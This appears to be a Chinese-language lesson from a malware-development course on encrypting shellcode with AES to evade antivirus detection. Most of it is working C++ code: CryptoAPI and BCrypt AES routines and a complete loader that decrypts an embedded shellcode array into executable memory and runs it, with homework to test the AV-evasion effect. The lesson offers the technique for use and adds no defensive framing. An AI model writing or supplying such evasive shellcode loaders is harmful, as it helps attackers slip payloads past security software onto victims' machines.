# 课时24：加密算法加密ShellCode

## 1. 课程目标

学习使用标准加密算法（AES、ChaCha20等）加密ShellCode。

---

## 2. AES加密

### 2.1 使用Windows CryptoAPI

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

// AES加密
BOOL AESEncrypt(LPBYTE pData, DWORD dwDataLen, LPBYTE pKey, DWORD dwKeyLen,
                LPBYTE* ppEncrypted, DWORD* pdwEncryptedLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BOOL result = FALSE;
    
    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // 从密码派生密钥
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;
    
    // 计算加密后大小
    DWORD dwLen = dwDataLen;
    CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dwLen, 0);
    
    *ppEncrypted = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, dwLen);
    memcpy(*ppEncrypted, pData, dwDataLen);
    *pdwEncryptedLen = dwDataLen;
    
    if (!CryptEncrypt(hKey, 0, TRUE, 0, *ppEncrypted, pdwEncryptedLen, dwLen)) {
        HeapFree(GetProcessHeap(), 0, *ppEncrypted);
        goto cleanup;
    }
    
    result = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return result;
}

// AES解密
BOOL AESDecrypt(LPBYTE pEncrypted, DWORD dwEncryptedLen, LPBYTE pKey, DWORD dwKeyLen,
                LPBYTE* ppDecrypted, DWORD* pdwDecryptedLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BOOL result = FALSE;
    
    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, pKey, dwKeyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;
    
    *ppDecrypted = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, dwEncryptedLen);
    memcpy(*ppDecrypted, pEncrypted, dwEncryptedLen);
    *pdwDecryptedLen = dwEncryptedLen;
    
    if (!CryptDecrypt(hKey, 0, TRUE, 0, *ppDecrypted, pdwDecryptedLen)) {
        HeapFree(GetProcessHeap(), 0, *ppDecrypted);
        goto cleanup;
    }
    
    result = TRUE;
    
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return result;
}
```

### 2.2 完整Loader

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

// 加密后的ShellCode
unsigned char encryptedSC[] = { /* 加密数据 */ };

// 密钥
char password[] = "MySecretPassword123!";

int main() {
    LPBYTE pDecrypted = NULL;
    DWORD dwDecryptedLen = 0;
    
    // 解密
    if (!AESDecrypt(encryptedSC, sizeof(encryptedSC),
                    (LPBYTE)password, strlen(password),
                    &pDecrypted, &dwDecryptedLen)) {
        printf("[-] 解密失败\n");
        return 1;
    }
    
    // 分配可执行内存
    LPVOID pExec = VirtualAlloc(NULL, dwDecryptedLen,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    memcpy(pExec, pDecrypted, dwDecryptedLen);
    
    // 清理解密缓冲区
    SecureZeroMemory(pDecrypted, dwDecryptedLen);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    
    // 执行
    ((void(*)())pExec)();
    
    return 0;
}
```

---

## 3. 使用BCrypt API

```cpp
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// BCrypt AES解密
BOOL BCryptAESDecrypt(LPBYTE pCiphertext, DWORD cbCiphertext,
                      LPBYTE pKey, DWORD cbKey,
                      LPBYTE pIV, DWORD cbIV,
                      LPBYTE* ppPlaintext, DWORD* pcbPlaintext) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;
    
    // 打开AES算法
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;
    
    // 设置CBC模式
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                     (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                     sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    
    // 创建密钥
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, cbKey, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    
    // 获取输出大小
    DWORD cbPlaintext = 0;
    BCryptDecrypt(hKey, pCiphertext, cbCiphertext, NULL, pIV, cbIV,
                  NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
    
    *ppPlaintext = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
    
    // 解密
    status = BCryptDecrypt(hKey, pCiphertext, cbCiphertext, NULL,
                          pIV, cbIV, *ppPlaintext, cbPlaintext,
                          pcbPlaintext, BCRYPT_BLOCK_PADDING);
    
    result = BCRYPT_SUCCESS(status);
    
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
```

---

## 4. 课后作业

### 作业1：AES加密Loader（必做）

1. 使用CryptoAPI实现AES加密解密
2. 测试免杀效果

### 作业2：BCrypt API（进阶）

1. 使用BCrypt API实现AES-256-CBC
2. 正确处理IV和填充

---

## 5. 下一课预告

下一课我们将学习补充ShellCode加载方式。